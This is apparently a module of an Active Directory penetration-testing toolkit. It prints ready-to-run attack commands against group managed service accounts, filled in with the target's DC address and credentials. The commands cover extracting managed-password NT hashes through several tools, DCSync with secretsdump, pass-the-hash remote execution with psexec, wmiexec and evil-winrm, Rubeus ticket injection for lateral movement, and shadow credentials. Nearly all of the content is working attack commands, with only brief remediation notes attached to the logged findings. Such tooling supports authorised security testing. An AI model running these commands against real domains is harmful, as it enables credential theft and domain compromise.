"""
Module: gMSA (Group Managed Service Account) Attacks
Techniques: Enumerate gMSA, extract password blob, offline compute, KDS root key abuse
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("gMSA ATTACKS", "Group Managed Service Account Password Extraction")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(f"""
  {C}── ENUMERATION ──────────────────────────────────────────────────{RST}
  [1]  Enumerate gMSA Accounts
  [2]  Check Read Permission on msDS-ManagedPassword
  {C}── EXTRACTION ───────────────────────────────────────────────────{RST}
  [3]  Read msDS-ManagedPassword Blob    (PowerShell / AD Module)
  [4]  GMSAPasswordReader                (binary — dump NT hash)
  [5]  DSInternals — Compute Password    (offline from KDS root key)
  {C}── ABUSE ────────────────────────────────────────────────────────{RST}
  [6]  Pass-the-Hash with gMSA NT Hash
  [7]  Request TGT with gMSA Hash        (Rubeus)
  [8]  Shadow Credentials on gMSA        (if WriteProperty on msDS-KeyCredentialLink)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {NEON_CYN}Enumerate gMSA Accounts:{RST}

  # AD Module — list all gMSA
  Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword,
    msDS-ManagedPasswordInterval,msDS-GroupMSAMembership |
    select Name,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPasswordInterval

  # PowerView
  Get-DomainObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" |
    select name,dnshostname,'msds-groupmsamembership'

  # ldapsearch (Linux)
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b 'DC={dom.replace(".", ",DC=")}' \\
    '(objectClass=msDS-GroupManagedServiceAccount)' \\
    name msDS-ManagedPasswordInterval msDS-GroupMSAMembership

  {NEON_CYN}Key attributes:{RST}
  {DIM}• msDS-ManagedPasswordInterval  — password rotation period (days)
  • PrincipalsAllowedToRetrieveManagedPassword — who can read the password
  • msDS-ManagedPasswordId  — points to KDS root key used for this account{RST}
""")

    elif c == "2":
        gmsa = prompt("gMSA account name (e.g. svc_backup$)")
        print(f"""
  {NEON_CYN}Check Who Can Read {gmsa} Password Blob:{RST}

  # AD Module
  $gmsa = Get-ADServiceAccount -Identity '{gmsa}' \\
    -Properties PrincipalsAllowedToRetrieveManagedPassword
  $gmsa.PrincipalsAllowedToRetrieveManagedPassword

  # Check if current user / machine is in allowed list
  $allowed = (Get-ADServiceAccount '{gmsa}' \\
    -Properties PrincipalsAllowedToRetrieveManagedPassword).PrincipalsAllowedToRetrieveManagedPassword
  $allowed | Get-ADObject

  # PowerView ACL check
  Get-DomainObjectAcl -Identity '{gmsa}' -ResolveGUIDs |
    ?{{$_.ObjectAceType -eq "ms-DS-ManagedPassword"}} |
    select IdentityReference,ActiveDirectoryRights

  {NEON_CYN}If current machine/user is in allowed principals:{RST}
  → Can directly read msDS-ManagedPassword blob → extract NT hash
""")

    elif c == "3":
        gmsa = prompt("gMSA account name (e.g. svc_backup$)")
        print(f"""
  {NEON_CYN}Read msDS-ManagedPassword Blob — PowerShell:{RST}

  # Must run on a machine/as a user in PrincipalsAllowedToRetrieveManagedPassword

  # Method 1 — AD Module
  $gmsa = Get-ADServiceAccount -Identity '{gmsa}' -Properties 'msDS-ManagedPassword'
  $mp   = $gmsa.'msDS-ManagedPassword'
  # Decode blob (returns current + previous password)
  ConvertFrom-ADManagedPasswordBlob $mp

  # Method 2 — Direct LDAP attribute read
  $searcher = [adsisearcher]"(sAMAccountName={gmsa})"
  $searcher.PropertiesToLoad.Add("msDS-ManagedPassword") | Out-Null
  $result   = $searcher.FindOne()
  $blob     = $result.Properties["msds-managedpassword"][0]

  # Method 3 — DSInternals (full decode)
  Import-Module DSInternals
  $sc = Get-ADReplAccount -SamAccountName '{gmsa}' -Server {dc}
  $sc | Format-Custom -View NTHashHistory
""")

    elif c == "4":
        gmsa = prompt("gMSA account name (e.g. svc_backup$)")
        print(f"""
  {NEON_CYN}GMSAPasswordReader — Extract NT Hash Directly:{RST}

  {DIM}GMSAPasswordReader.exe reads msDS-ManagedPassword attribute and
  outputs the NT hash in usable form — no DSInternals needed.{RST}

  # Run on allowed machine (member of PrincipalsAllowedToRetrieveManagedPassword)
  .\\GMSAPasswordReader.exe --AccountName '{gmsa}'

  {NEON_CYN}Output example:{RST}
  {DIM}[*] Account: {gmsa}
  [*] NTLM Hash (current):   aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
  [*] NTLM Hash (previous):  aad3b435b51404eeaad3b435b51404ee:yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy{RST}

  {NEON_CYN}Impacket alternative (Linux):{RST}
  # If you have credentials of an allowed principal:
  python3 gMSADumper.py -u '{user}' -p '{pw}' -d {dom} -l {dc}
""")
        add_finding("gMSA Password Extracted", "Critical",
                    f"NT hash of gMSA account '{gmsa}' extracted via GMSAPasswordReader",
                    "Restrict PrincipalsAllowedToRetrieveManagedPassword to minimum required principals; monitor msDS-ManagedPassword reads")

    elif c == "5":
        gmsa = prompt("gMSA account name")
        print(f"""
  {NEON_CYN}DSInternals — Offline gMSA Password Computation:{RST}

  {DIM}If you have Domain Admin / DCSync rights, you can compute the gMSA
  password offline using the KDS root key from Active Directory.{RST}

  ── Step 1: Get KDS root key (requires DA or DCSync) ─────────────────────
  Import-Module DSInternals
  $kdsKey = Get-KdsRootKey

  ── Step 2: Get gMSA attributes ───────────────────────────────────────────
  $gmsa = Get-ADServiceAccount -Identity '{gmsa}' \\
    -Properties msDS-ManagedPasswordId,msDS-ManagedPasswordInterval,
               msDS-GroupMSAMembership,ObjectSID

  ── Step 3: Compute password offline ──────────────────────────────────────
  $password = $kdsKey | ConvertTo-NTHash -SamAccountName '{gmsa}' \\
    -ManagedPasswordInterval $gmsa.'msDS-ManagedPasswordInterval'

  # Or use full computation:
  Get-ADReplAccount -SamAccountName '{gmsa}' -Server {dc} |
    Format-Custom -View NTHashHistory

  ── Linux / impacket-secretsdump ──────────────────────────────────────────
  # DCSync to get gMSA NT hash directly:
  impacket-secretsdump {dom}/{user}:'{pw}'@{dc} \\
    -just-dc-user '{gmsa}' -outputfile /tmp/gmsa_hash.txt
""")

    elif c == "6":
        gmsa = prompt("gMSA account name (with $, e.g. svc_backup$)")
        nth  = prompt("NT hash of gMSA account")
        print(f"""
  {NEON_CYN}Pass-the-Hash with gMSA NT Hash:{RST}

  # NXC — verify access
  nxc smb {dc} -u '{gmsa}' -H '{nth}' -d {dom}

  # Impacket — remote exec
  impacket-psexec {dom}/'{gmsa}'@{dc} -hashes :{nth}
  impacket-wmiexec {dom}/'{gmsa}'@{dc} -hashes :{nth}
  impacket-smbexec {dom}/'{gmsa}'@{dc} -hashes :{nth}

  # Evil-WinRM
  evil-winrm -i {dc} -u '{gmsa}' -H {nth} -d {dom}

  {DIM}Note: gMSA accounts often run high-privilege services (backup, SQL, etc.)
  Their service context = their privilege level on all machines they manage.{RST}
""")

    elif c == "7":
        gmsa = prompt("gMSA account name (with $)")
        nth  = prompt("NT hash of gMSA account")
        print(f"""
  {NEON_CYN}Request TGT with gMSA Hash (Rubeus):{RST}

  # Request TGT using NTLM hash
  Rubeus.exe asktgt /user:'{gmsa}' /rc4:{nth} /domain:{dom} /dc:{dc} /ptt

  # Request TGT using AES256 key (if available — more stealthy)
  Rubeus.exe asktgt /user:'{gmsa}' /aes256:<aes256_key> /domain:{dom} /dc:{dc} /ptt

  # Verify ticket is injected
  Rubeus.exe triage

  # Use ticket for lateral movement
  ls \\\\<target>\\c$
  Enter-PSSession -ComputerName <target>

  {NEON_CYN}Kerberoast gMSA (if SPN is set):{RST}
  Rubeus.exe kerberoast /user:'{gmsa}' /domain:{dom} /dc:{dc}
  {DIM}Note: gMSA passwords are 256-bit random — kerberoasting is impractical to crack.
  PTH/PTT is the preferred approach.{RST}
""")

    elif c == "8":
        gmsa = prompt("gMSA account name")
        print(f"""
  {NEON_CYN}Shadow Credentials on gMSA Account:{RST}

  {DIM}If you have WriteProperty on msDS-KeyCredentialLink for the gMSA,
  you can add a Shadow Credential → get PKINIT TGT → extract NT hash.
  This works even without knowing the gMSA password blob.{RST}

  ── Check write permission ────────────────────────────────────────────────
  Find-InterestingDomainAcl -ResolveGUIDs |
    ?{{$_.ObjectDN -like "*{gmsa}*" -and $_.ActiveDirectoryRights -match "WriteProperty"}}

  ── Add shadow credential ─────────────────────────────────────────────────
  # Whisker
  .\\Whisker.exe add /target:'{gmsa}'

  # Pywhisker (Linux)
  python3 pywhisker.py -d {dom} -u '{user}' -p '{pw}' \\
    --target '{gmsa}' --action add --dc-ip {dc}

  ── Get TGT + NT hash via PKINIT ──────────────────────────────────────────
  Rubeus.exe asktgt /user:'{gmsa}' /certificate:<base64_pfx> \\
    /password:"<pfx_pass>" /domain:{dom} /dc:{dc} /getcredentials /show

  {DIM}Output includes NT hash in "NTLM" field → use for PTH or further attacks.{RST}
""")
        add_finding("Shadow Credentials on gMSA", "High",
                    f"msDS-KeyCredentialLink writable on {gmsa} — shadow cred added → NT hash extracted",
                    "Restrict WriteProperty on msDS-KeyCredentialLink; monitor attribute modifications (Event 4662)")

    pause()
